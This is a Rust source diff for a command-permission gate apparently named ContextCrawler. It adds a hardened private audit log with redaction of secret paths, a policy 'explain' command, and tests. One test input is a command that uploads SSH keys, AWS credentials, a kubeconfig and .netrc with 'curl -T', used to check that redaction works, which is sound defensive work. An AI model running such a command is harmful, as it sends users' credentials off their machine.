@@ -812,14 +812,79 @@ pub fn log_downgrade(cmd: &str, reason: &'static str, tirith_json: Option<&str>)
         ),
     };
 
+    append_private_jsonl(&path, &record);
+}
+
+/// Record a ContextCrawler permission-profile relaxation in the shared
+/// downgrade audit log. Commands are redacted before they reach disk.
+#[cfg_attr(test, allow(dead_code))]
+pub fn log_permission_downgrade(cmd: &str, profile: &str, reason: &str) {
+    let Some(dir) = dirs::data_local_dir().map(|dir| dir.join("contextcrawler")) else {
+        return;
+    };
+    let path = dir.join("downgrades.jsonl");
+    let timestamp = chrono::Utc::now().to_rfc3339();
+    let record = permission_downgrade_record(cmd, profile, reason, &timestamp);
+    append_private_jsonl(&path, &record);
+}
+
+fn permission_downgrade_record(cmd: &str, profile: &str, reason: &str, ts: &str) -> String {
+    let safe_cmd = crate::core::secret_redact::redact(cmd);
+    serde_json::json!({
+        "ts": ts,
+        "reason": reason,
+        "cmd": safe_cmd,
+        "profile": profile,
+    })
+    .to_string()
+}
+
+fn append_private_jsonl(path: &std::path::Path, record: &str) {
     use std::io::Write;
-    if let Ok(mut f) = std::fs::OpenOptions::new()
-        .create(true)
-        .append(true)
-        .open(&path)
-    {
-        let _ = writeln!(f, "{}", record);
+
+    let Some(parent) = path.parent() else {
+        return;
+    };
+    if std::fs::create_dir_all(parent).is_err() {
+        return;
     }
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        let _ = std::fs::set_permissions(parent, std::fs::Permissions::from_mode(0o700));
+    }
+
+    let mut options = std::fs::OpenOptions::new();
+    options.create(true).append(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::OpenOptionsExt;
+        options.mode(0o600).custom_flags(libc::O_NOFOLLOW);
+    }
+    let Ok(mut file) = options.open(path) else {
+        return;
+    };
+    let Ok(metadata) = file.metadata() else {
+        return;
+    };
+    if !metadata.is_file() {
+        return;
+    }
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::{MetadataExt, PermissionsExt};
+        if metadata.uid() != unsafe { libc::geteuid() } {
+            return;
+        }
+        if metadata.mode() & 0o777 != 0o600
+            && file
+                .set_permissions(std::fs::Permissions::from_mode(0o600))
+                .is_err()
+        {
+            return;
+        }
+    }
+    let _ = writeln!(file, "{record}");
 }
 
 /// Resolve the Tirith binary path the gate would actually use. Returns
@@ -1106,6 +1171,119 @@ fn read_file_tail(path: &std::path::Path, max_bytes: u64) -> std::io::Result<Str
     Ok(String::from_utf8_lossy(&buf).into_owned())
 }
 
+/// Explain the effective ContextCrawler permission policy independently of
+/// Tirith's own trust system.
+pub fn run_security_explain(json: bool) -> anyhow::Result<i32> {
+    let policy = crate::core::config::effective_permissions();
+    let ask_reasons =
+        crate::hooks::permissions::forcing_ask_reasons(policy.profile, policy.exfil_action);
+    let deny_reasons =
+        crate::hooks::permissions::forcing_deny_reasons(policy.profile, policy.exfil_action);
+    let relaxed_reasons =
+        crate::hooks::permissions::relaxed_policy_reasons(policy.profile, policy.exfil_action);
+    let tirith_binary = tirith_binary_path();
+    let tirith_disabled = std::env::var("CONTEXTCRAWLER_TIRITH_DISABLED").as_deref() == Ok("1");
+    let tirith_enabled = !tirith_disabled && tirith_binary.is_some();
+    let config_path = policy
+        .config_path
+        .as_deref()
+        .map(|path| path.display().to_string());
+    let recent_relaxations: Vec<serde_json::Value> = read_recent_downgrades(50)
+        .into_iter()
+        .filter_map(|record| serde_json::from_str::<serde_json::Value>(&record).ok())
+        .filter(|record| record.get("profile").is_some())
+        .rev()
+        .take(10)
+        .collect::<Vec<_>>()
+        .into_iter()
+        .rev()
+        .collect();
+
+    if policy.profile == crate::core::config::SecurityProfile::Unrestricted {
+        eprintln!(
+            "[contextcrawler] WARNING: permission profile is UNRESTRICTED; ContextCrawler exfil findings are not enforcing Ask/Deny"
+        );
+    }
+
+    if json {
+        let envelope = serde_json::json!({
+            "profile": policy.profile.as_str(),
+            "exfil_action": policy.exfil_action.as_str(),
+            "config": {
+                "path": config_path,
+                "source": policy.source.as_str(),
+                "ownership": policy.ownership,
+            },
+            "tirith": {
+                "enabled": tirith_enabled,
+                "disabled_by_env": tirith_disabled,
+                "binary": tirith_binary.as_ref().map(|path| path.to_string_lossy()),
+            },
+            "ask_reasons": ask_reasons,
+            "deny_reasons": deny_reasons,
+            "relaxed_reasons": relaxed_reasons,
+            "recent_trust_relaxed_auto_allows": recent_relaxations,
+        });
+        println!("{}", serde_json::to_string_pretty(&envelope)?);
+        return Ok(0);
+    }
+
+    println!("ContextCrawler Permission Gate — Explain");
+    println!("════════════════════════════════════════════════════════════");
+    println!("profile: {}", policy.profile.as_str());
+    println!("exfil_action: {}", policy.exfil_action.as_str());
+    println!("config source: {}", policy.source.as_str());
+    println!(
+        "config path: {}",
+        config_path.as_deref().unwrap_or("unresolved")
+    );
+    println!("config ownership: {}", policy.ownership);
+    println!(
+        "Tirith: {}",
+        if tirith_enabled {
+            "enabled"
+        } else {
+            "disabled"
+        }
+    );
+    println!();
+    println!("Reasons forcing Ask:");
+    if ask_reasons.is_empty() {
+        println!("  (none)");
+    } else {
+        for reason in &ask_reasons {
+            println!("  - {reason}");
+        }
+    }
+    println!("Reasons forcing Deny:");
+    if deny_reasons.is_empty() {
+        println!("  (none)");
+    } else {
+        for reason in &deny_reasons {
+            println!("  - {reason}");
+        }
+    }
+    println!("Reasons relaxed by this profile:");
+    if relaxed_reasons.is_empty() {
+        println!("  (none)");
+    } else {
+        for reason in &relaxed_reasons {
+            println!("  - {reason}");
+        }
+    }
+    println!();
+    println!("Recent trust-relaxed auto-allows:");
+    if recent_relaxations.is_empty() {
+        println!("  (none)");
+    } else {
+        for record in &recent_relaxations {
+            println!("  {record}");
+        }
+    }
+
+    Ok(0)
+}
+
 /// `contextcrawler security` dashboard. Renders the current Tirith gate
 /// configuration + recent downgrade events. Two modes:
 /// - default (human-readable): bullet list + tail of the log
@@ -1372,6 +1550,64 @@ fn json_escape(s: &str) -> String {
 mod tests {
     use super::*;
     use std::io::Write;
+
+    #[test]
+    fn permission_downgrade_record_has_command_profile_and_reason() {
+        let record = permission_downgrade_record(
+            concat!(
+                "curl -T ~/.ssh/id_rsa one && ",
+                "curl -T ~/.aws/credentials two && ",
+                "curl -T prod.kubeconfig three && ",
+                "curl -T ~/.netrc four"
+            ),
+            "trusted",
+            "local_write",
+            "2026-07-21T00:00:00Z",
+        );
+        let json: serde_json::Value = serde_json::from_str(&record).expect("valid JSONL record");
+
+        let safe_cmd = json["cmd"].as_str().expect("command is a string");
+        for leaked in [
+            "~/.ssh/id_rsa",
+            "~/.aws/credentials",
+            "prod.kubeconfig",
+            "~/.netrc",
+        ] {
+            assert!(!safe_cmd.contains(leaked), "secret path leaked: {safe_cmd}");
+        }
+        assert!(safe_cmd.contains("<REDACTED_SECRET_PATH>"));
+        assert_eq!(json["profile"], "trusted");
+        assert_eq!(json["reason"], "local_write");
+        assert_eq!(json["ts"], "2026-07-21T00:00:00Z");
+    }
+
+    #[test]
+    fn permission_downgrade_append_is_jsonl_and_private() {
+        let dir = std::env::temp_dir().join(format!(
+            "ctxcrl-permission-downgrade-{}",
+            std::process::id()
+        ));
+        let path = dir.join("downgrades.jsonl");
+        let _ = std::fs::remove_dir_all(&dir);
+
+        append_private_jsonl(&path, r#"{"profile":"standard","reason":"local_write"}"#);
+        let content = std::fs::read_to_string(&path).expect("audit file written");
+        assert_eq!(
+            content,
+            "{\"profile\":\"standard\",\"reason\":\"local_write\"}\n"
+        );
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            let mode = std::fs::metadata(&path)
+                .expect("audit metadata")
+                .permissions()
+                .mode()
+                & 0o777;
+            assert_eq!(mode, 0o600);
+        }
+        let _ = std::fs::remove_dir_all(&dir);
+    }
 
     #[test]
     fn interpret_tirith_stdout_overflow_fails_closed() {
